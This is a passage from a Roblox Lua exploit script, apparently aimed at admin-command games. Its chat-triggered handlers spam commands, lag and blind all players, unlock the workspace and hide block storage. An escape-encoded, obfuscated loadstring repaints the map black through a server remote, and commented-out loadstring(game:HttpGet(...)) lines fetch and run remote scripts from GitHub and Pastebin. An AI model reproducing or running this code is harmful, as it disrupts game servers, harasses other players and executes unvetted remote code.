                        cht("//spam h fardaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa " .. math.random(1, 1000));wait(.65)
                        cht("/super h fordbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb " .. math.random(1, 1000));wait(.65)
                        cht("/lagall " .. math.random(1, 1000));wait(9.7)
                        say("Only exploiters can read this");wait()
                        cht("//stop") -- Incase the spam hasn't stopped yet
                    end
                    if msg:lower() == prefix .. "blackout" then
                        cht("time -");wait()
                        cht("time 0")
                        cht("gear me 0000000000000000000000000000094333296")
                        --loadstring(
                        --    "local\32function\32b\40b\41ChatBar\58SetTextFromInput\40b\41game\46Players\58Chat\40b\41ChatBar\46Text\61\34\34end\59colorAPI\61\123\125colorAPI\46color\61function\40b\44c\41local\32b\61coroutine\46create\40function\40\41local\32b\61\123\91\34Part\34\93\61b\44\91\34Color\34\93\61c\125game\58GetService\40\34Workspace\34\41\91game\58GetService\40\34Players\34\41\46LocalPlayer\46Name\93\46PaintBucket\58WaitForChild\40\34Remotes\34\41\46ServerControls\58InvokeServer\40\34PaintPart\34\44b\41end\41coroutine\46resume\40b\41end\59colorAPI\46transformToColor\51\61function\40b\41local\32c\61b\46r\59local\32d\61b\46g\59local\32b\61b\46b\59return\32Color\51\46new\40c\44d\44b\41end\59colorAPI\46colorObbyBox\61function\40b\41for\32c\44c\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Obby\32Box\34\93\58GetChildren\40\41\41do\32colorAPI\46color\40c\44b\41end\32end\59colorAPI\46colorObbyBricks\61function\40b\41for\32c\44c\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Obby\34\93\58GetChildren\40\41\41do\32colorAPI\46color\40c\44b\41end\32end\59colorAPI\46colorAdminDivs\61function\40b\41for\32c\44c\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Admin\32Dividers\34\93\58GetChildren\40\41\41do\32colorAPI\46color\40c\44b\41end\32end\59colorAPI\46colorPads\61function\40b\41for\32c\44c\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Admin\91\34Pads\34\93\58GetChildren\40\41\41do\32colorAPI\46color\40c\46Head\44b\41end\32end\59colorAPI\46colorHouse\61function\40b\41local\32c\61b\46wallsC\59local\32d\61b\46baseC\59local\32e\61b\46roofC\59local\32f\61b\46WANDDC\59local\32g\61b\46stairsC\59local\32h\61b\46floorC\59local\32i\61b\46rooftsC\59local\32b\61b\46chiC\59for\32j\44j\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Basic\32House\34\93\58GetChildren\40\41\41do\32coroutine\46wrap\40function\40\41if\32j\46Name\61\61\34SmoothBlockModel\49\48\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\56\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\53\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\55\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\56\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\57\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\56\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\52\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\54\34or\32j\46Name\61\61\34SmoothBlockModel\50\54\34or\32j\46Name\61\61\34SmoothBlockModel\50\57\34or\32j\46Name\61\61\34SmoothBlockModel\51\48\34or\32j\46Name\61\61\34SmoothBlockModel\51\49\34or\32j\46Name\61\61\34SmoothBlockModel\51\54\34or\32j\46Name\61\61\34SmoothBlockModel\51\55\34or\32j\46Name\61\61\34SmoothBlockModel\51\56\34or\32j\46Name\61\61\34SmoothBlockModel\51\57\34or\32j\46Name\61\61\34SmoothBlockModel\52\49\34or\32j\46Name\61\61\34SmoothBlockModel\52\56\34or\32j\46Name\61\61\34SmoothBlockModel\52\57\34or\32j\46Name\61\61\34SmoothBlockModel\53\49\34or\32j\46Name\61\61\34SmoothBlockModel\53\54\34or\32j\46Name\61\61\34SmoothBlockModel\54\55\34or\32j\46Name\61\61\34SmoothBlockModel\54\56\34or\32j\46Name\61\61\34SmoothBlockModel\54\57\34or\32j\46Name\61\61\34SmoothBlockModel\55\48\34or\32j\46Name\61\61\34SmoothBlockModel\55\50\34or\32j\46Name\61\61\34SmoothBlockModel\55\53\34or\32j\46Name\61\61\34SmoothBlockModel\56\34or\32j\46Name\61\61\34SmoothBlockModel\56\49\34or\32j\46Name\61\61\34SmoothBlockModel\56\53\34or\32j\46Name\61\61\34SmoothBlockModel\57\51\34or\32j\46Name\61\61\34SmoothBlockModel\57\56\34then\32colorAPI\46color\40j\44c\41end\59if\32j\46Name\61\61\34SmoothBlockModel\52\48\34then\32colorAPI\46color\40j\44d\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\48\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\52\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\53\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\54\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\57\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\53\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\55\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\57\34or\32j\46Name\61\61\34SmoothBlockModel\50\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\51\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\51\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\53\34or\32j\46Name\61\61\34SmoothBlockModel\50\56\34or\32j\46Name\61\61\34SmoothBlockModel\51\50\34or\32j\46Name\61\61\34SmoothBlockModel\51\51\34or\32j\46Name\61\61\34SmoothBlockModel\51\52\34or\32j\46Name\61\61\34SmoothBlockModel\52\50\34or\32j\46Name\61\61\34SmoothBlockModel\52\52\34or\32j\46Name\61\61\34SmoothBlockModel\52\55\34or\32j\46Name\61\61\34SmoothBlockModel\53\52\34or\32j\46Name\61\61\34SmoothBlockModel\53\53\34or\32j\46Name\61\61\34SmoothBlockModel\53\56\34or\32j\46Name\61\61\34SmoothBlockModel\53\57\34or\32j\46Name\61\61\34SmoothBlockModel\54\34or\32j\46Name\61\61\34SmoothBlockModel\54\49\34or\32j\46Name\61\61\34SmoothBlockModel\54\50\34or\32j\46Name\61\61\34SmoothBlockModel\54\51\34or\32j\46Name\61\61\34SmoothBlockModel\55\52\34or\32j\46Name\61\61\34SmoothBlockModel\55\54\34or\32j\46Name\61\61\34SmoothBlockModel\55\55\34or\32j\46Name\61\61\34SmoothBlockModel\55\56\34or\32j\46Name\61\61\34SmoothBlockModel\55\57\34or\32j\46Name\61\61\34SmoothBlockModel\56\48\34or\32j\46Name\61\61\34SmoothBlockModel\56\52\34or\32j\46Name\61\61\34SmoothBlockModel\56\54\34or\32j\46Name\61\61\34SmoothBlockModel\56\55\34or\32j\46Name\61\61\34SmoothBlockModel\56\56\34or\32j\46Name\61\61\34SmoothBlockModel\57\48\34or\32j\46Name\61\61\34SmoothBlockModel\57\49\34or\32j\46Name\61\61\34SmoothBlockModel\57\50\34or\32j\46Name\61\61\34SmoothBlockModel\57\52\34or\32j\46Name\61\61\34SmoothBlockModel\57\53\34or\32j\46Name\61\61\34SmoothBlockModel\57\54\34then\32colorAPI\46color\40j\44e\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\57\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\52\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\54\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\55\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\56\34or\32j\46Name\61\61\34SmoothBlockModel\50\52\34or\32j\46Name\61\61\34SmoothBlockModel\50\55\34or\32j\46Name\61\61\34SmoothBlockModel\51\53\34or\32j\46Name\61\61\34SmoothBlockModel\52\34or\32j\46Name\61\61\34SmoothBlockModel\52\51\34or\32j\46Name\61\61\34SmoothBlockModel\52\53\34or\32j\46Name\61\61\34SmoothBlockModel\52\54\34or\32j\46Name\61\61\34SmoothBlockModel\53\48\34or\32j\46Name\61\61\34SmoothBlockModel\53\51\34or\32j\46Name\61\61\34SmoothBlockModel\53\55\34or\32j\46Name\61\61\34SmoothBlockModel\54\48\34or\32j\46Name\61\61\34SmoothBlockModel\54\52\34or\32j\46Name\61\61\34SmoothBlockModel\54\53\34or\32j\46Name\61\61\34SmoothBlockModel\54\54\34or\32j\46Name\61\61\34SmoothBlockModel\55\34or\32j\46Name\61\61\34SmoothBlockModel\55\49\34or\32j\46Name\61\61\34SmoothBlockModel\55\51\34or\32j\46Name\61\61\34SmoothBlockModel\56\50\34or\32j\46Name\61\61\34SmoothBlockModel\56\51\34or\32j\46Name\61\61\34SmoothBlockModel\56\57\34or\32j\46Name\61\61\34SmoothBlockModel\57\57\34then\32colorAPI\46color\40j\44f\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\34or\32j\46Name\61\61\34SmoothBlockModel\51\34or\32j\46Name\61\61\34SmoothBlockModel\53\34or\32j\46Name\61\61\34SmoothBlockModel\57\34then\32colorAPI\46color\40j\44g\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\49\50\34then\32colorAPI\46color\40j\44h\41end\59if\32j\46Name\61\61\34SmoothBlockModel\53\50\34or\32j\46Name\61\61\34SmoothBlockModel\57\55\34then\32colorAPI\46color\40j\44i\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\54\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\56\34then\32colorAPI\46color\40j\44b\41end\32end\41\40\41end\32end\59colorAPI\46colorBuildingBricks\61function\40b\41local\32c\61b\46DarkStoneGrey\59local\32d\61b\46DeepBlue\59local\32e\61b\46NY\59local\32f\61b\46IW\59local\32g\61b\46LimeGreen\59local\32h\61b\46MSG\59local\32i\61b\46RB\59local\32j\61b\46RR\59local\32b\61b\46TP\59for\32k\44k\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Building\32Bricks\34\93\58GetChildren\40\41\41do\32coroutine\46wrap\40function\40\41if\32k\46Name\61\61\34Part\50\57\34or\32k\46Name\61\61\34Part\51\49\34or\32k\46Name\61\61\34Part\53\53\34then\32colorAPI\46color\40k\44c\41end\59if\32k\46Name\61\61\34Part\49\49\34or\32k\46Name\61\61\34Part\49\56\34or\32k\46Name\61\61\34Part\50\53\34or\32k\46Name\61\61\34Part\51\34or\32k\46Name\61\61\34Part\52\51\34then\32colorAPI\46color\40k\44d\41end\59if\32k\46Name\61\61\34Part\49\50\34or\32k\46Name\61\61\34Part\49\53\34or\32k\46Name\61\61\34Part\50\52\34or\32k\46Name\61\61\34Part\52\52\34or\32k\46Name\61\61\34Part\54\34then\32colorAPI\46color\40k\44e\41end\59if\32k\46Name\61\61\34Part\49\51\34or\32k\46Name\61\61\34Part\50\49\34or\32k\46Name\61\61\34Part\50\51\34or\32k\46Name\61\61\34Part\55\34then\32colorAPI\46color\40k\44f\41end\59if\32k\46Name\61\61\34Part\49\55\34or\32k\46Name\61\61\34Part\50\54\34or\32k\46Name\61\61\34Part\51\56\34or\32k\46Name\61\61\34Part\57\34or\32k\46Name\61\61\34Part\53\34then\32colorAPI\46color\40k\44g\41end\59if\32k\46Name\61\61\34Part\51\48\34or\32k\46Name\61\61\34Part\51\50\34or\32k\46Name\61\61\34Part\51\51\34or\32k\46Name\61\61\34Part\51\52\34or\32k\46Name\61\61\34Part\51\53\34or\32k\46Name\61\61\34Part\51\54\34or\32k\46Name\61\61\34Part\51\57\34or\32k\46Name\61\61\34Part\52\48\34or\32k\46Name\61\61\34Part\52\49\34or\32k\46Name\61\61\34Part\52\50\34or\32k\46Name\61\61\34Part\52\54\34or\32k\46Name\61\61\34Part\52\55\34or\32k\46Name\61\61\34Part\52\56\34or\32k\46Name\61\61\34Part\52\57\34or\32k\46Name\61\61\34Part\53\48\34or\32k\46Name\61\61\34Part\53\49\34or\32k\46Name\61\61\34Part\53\50\34or\32k\46Name\61\61\34Part\53\51\34or\32k\46Name\61\61\34Part\53\52\34or\32k\46Name\61\61\34Part\53\54\34or\32k\46Name\61\61\34Part\53\55\34or\32k\46Name\61\61\34Part\53\56\34or\32k\46Name\61\61\34Part\53\57\34or\32k\46Name\61\61\34Part\54\48\34or\32k\46Name\61\61\34Part\54\49\34then\32colorAPI\46color\40k\44h\41end\59if\32k\46Name\61\61\34Part\49\52\34or\32k\46Name\61\61\34Part\49\57\34or\32k\46Name\61\61\34Part\50\34or\32k\46Name\61\61\34Part\50\55\34then\32colorAPI\46color\40k\44i\41end\59if\32k\46Name\61\61\34Part\49\34or\32k\46Name\61\61\34Part\49\48\34or\32k\46Name\61\61\34Part\49\54\34or\32k\46Name\61\61\34Part\50\50\34or\32k\46Name\61\61\34Part\51\55\34then\32colorAPI\46color\40k\44j\41end\59if\32k\46Name\61\61\34Part\50\48\34or\32k\46Name\61\61\34Part\50\56\34or\32k\46Name\61\61\34Part\52\34or\32k\46Name\61\61\34Part\52\53\34or\32k\46Name\61\61\34Part\56\34then\32colorAPI\46color\40k\44b\41end\32end\41\40\41end\32end\59b\40\34gear\32me\32\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\49\56\52\55\52\52\53\57\34\41wait\40\49\41game\46Players\46LocalPlayer\46Character\46Humanoid\58EquipTool\40game\46Players\46LocalPlayer\46Backpack\46PaintBucket\41wait\40\48\46\53\48\41coroutine\46wrap\40function\40\41colorAPI\46colorHouse\40\123wallsC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44baseC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44roofC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44WANDDC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44stairsC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44floorC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44rooftsC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44chiC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\125\41end\41\40\41spawn\40function\40\41colorAPI\46colorBuildingBricks\40\123DarkStoneGrey\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44DeepBlue\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44NY\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44IW\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44LimeGreen\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44MSG\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44RB\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44TP\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44RR\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\125\41end\41colorAPI\46color\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Baseplate\34\93\44colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41spawn\40function\40\41colorAPI\46colorObbyBox\40colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41end\41spawn\40function\40\41colorAPI\46colorObbyBricks\40colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41end\41spawn\40function\40\41colorAPI\46colorAdminDivs\40colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41end\41spawn\40function\40\41colorAPI\46colorPads\40colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41end\41wait\40\48\46\54\41b\40\34ungear\32\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\32me\32\34\46\46math\46random\40\57\57\57\57\57\41\41\10"
                       -- )()
                    end
                    if msg:lower() == prefix .. "effsex" then
                        cht("//infyield");wait()
                        cht("//savebuildstuff");wait(.85)
                        execCmd("f3x");wait(.35)
                        execCmd("unlockws")
                        execCmd("noclipcam")
                    end
                    if msg:lower() == prefix .. "removewater" then
                        cht("//infyield");wait(.65)
                        cht("/super gear me 00000000000000000000000000000000000000000000000000000000088146497");wait(1.65)
                        execCmd("noclipcam")
                        execCmd("usetools 50 0.033")
                        setclipboard("usetools 50 0.033")
                    end
                    if msg:lower() == prefix .. "savebuildstuff" then
                      --  loadstring(game:HttpGet(('https://raw.githubusercontent.com/SCchbVL5/scr4bl33/main/http_'),true))()
                        -- This is funzy's save/build script.
                    end
                    if msg:lower() == prefix .. "amogus" then
                        ELFRGD = false
                        cht("paint me red")
                        cht("/toggle antikill")
                        cht("//movedb");wait()
                        logn("Open source feel free to http sniff it");wait(.5)
                      -- loadstring (game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/FE%20amongus%20stable'),true))()
                        logn("Open source feel free to http sniff it")
                        cht("speed me 32")
                    end
                    if msg:lower() == prefix .. "sonic" then
                        if CS_LOADED and not _G.CS_DEBUG == true then
                            cht("//rj")
                            return
                            end;pcall(function() getgenv().CS_LOADED = true end)
                        ELFRGD = false
                        cht("/toggle antikill")
                        cht("//movedb");wait()
                        cht("char me 000000000000000000000000000001526224617");wait(1.65)
                        logn("Open source feel free to http sniff it")
                        -- loadstring(game:HttpGet(('https://pastebin.com/raw/K7YSDZsB'),true))()
                        logn("Reminder: You can use //god to be FE natural \n so to speak without any crazy animations. No admin required")
                    end
                    if msg:lower() == prefix .. "storagetp" then
                        logn("//nostoragetp disables this")
                        blockstorage2 = true
                        print("Lol you're a nugget according to your btools builds")
                    end
                    if msg:lower() == prefix .. "nostoragetp" then
                        logn("Disabled the click to storage")
                        blockstorage2 = false
                    end
                    if msg:lower() == prefix .. "createblockstorage" then
                        logn("Creating the storage \n Please wait...")
                        logn("Use alts to spawn more anchored blocks. \n This is for the SS btools")
                        cht("setgrav me -205");wait(.35)
                        cht("invis me 250");wait()
                        cht("size me .8");wait()
                        blockstorage2 = true
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000, 5000, 100000));wait(.15);game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000, 5000, 100000));wait(.15);game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000, 5000, 100000));wait(.15)
                        for i = 1, 31 do
                            for i = 1, 2 do
                                cht("freeze me 1" .. math.random(1, 1000));wait()
                                cht("tp me me me me 2" .. math.random(1, 1000));wait()
                            end
                            cht("freeze me " .. math.random(1, 1000))
                            utils:__wait() -- The times kinda vary
                        end
                        cht("clone me");wait(.65)
                        cht("//up");wait(.35)
                        logn("Finished creating storage")
                        cht("unchar me")
                    end
                    if msg:lower() == prefix .. "qs" then
                        logn("Creating a quick storage \n Please wait... It only takes a few seconds")
                        logn("Use alts to spawn more anchored blocks. \n This is for the SS btools")
                        cht("/btools others");wait()
                        cht("setgrav me -5");wait(.35)
                        cht("invis me 250");wait()
                        cht("size me .8");wait()
                        blockstorage2 = true
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-99999, 5014, 99801));wait(.65);game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-99999, 5014, 99801));wait(.35);game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-99999, 5014, 99801));wait(.15)
                        cht("//super freeze me,me,me " .. math.random(1, 1000));wait(.65)
                        cht("clone me");wait(.65)
                        cht("//up");wait(.35)
                        logn("Finished creating quick storage")
                        cht("unchar me,me,me,me,me,me,m,e,me,me,me,1,e,me")
                    end
                    if msg:lower() == prefix .. "genbigblocks" then
                        logn("Creating a quick storage \n Please wait... It only takes a few seconds")
                        logn("Use alts to spawn more anchored blocks. \n This is for the SS btools")
                        cht("/btools others");wait()
                        cht("setgrav me -5");wait(.35)
                        cht("invis me 250");wait()
                        blockstorage2 = true
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-99999, 5014, 99801));wait(.65);game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-99999, 5014, 99801));wait(.35);game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-99999, 5014, 99801));wait(.15)
                        cht("//super freeze me,me,me " .. math.random(1, 1000));wait(.65)
                        cht("size me 10");wait(2.65)
                        cht("clone me");wait(1.35)
                        cht("//up");wait(.35)
                        logn("Finished creating quick storage")
                        cht("unchar me,me,me,me,me,me,m,e,me,me,me,1,e,me")
                    end
                    if msg:lower() == prefix .. "ls" then
                        logn("Creating a quick land storage \n Please wait... It only takes a few seconds")
                        logn("Use alts to spawn more anchored blocks. \n This is for the SS btools")
                        cht("/btools others");wait()
                        cht("setgrav me -250");wait(.35)
                        cht("invis me 250");wait()
                        cht("size me .8");wait()
                        blockstorage2 = false
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-207, 4, 18));wait(.65);game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-207, 4, 18));wait(.35);game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-207, 4, 18));wait(.15)
                        cht("//super freeze me,me,me " .. math.random(1, 1000));wait(.65)
                        cht("clone me");wait(.65)
                        cht("//up");wait(.35)
                        logn("Finished creating quick storage")
                        cht("unchar me,me,me,me,me,me,m,e,me,me,me,1,e,me")
                    end
                    if msg:lower() == prefix .. "scramble" then
                        cht("blind all")
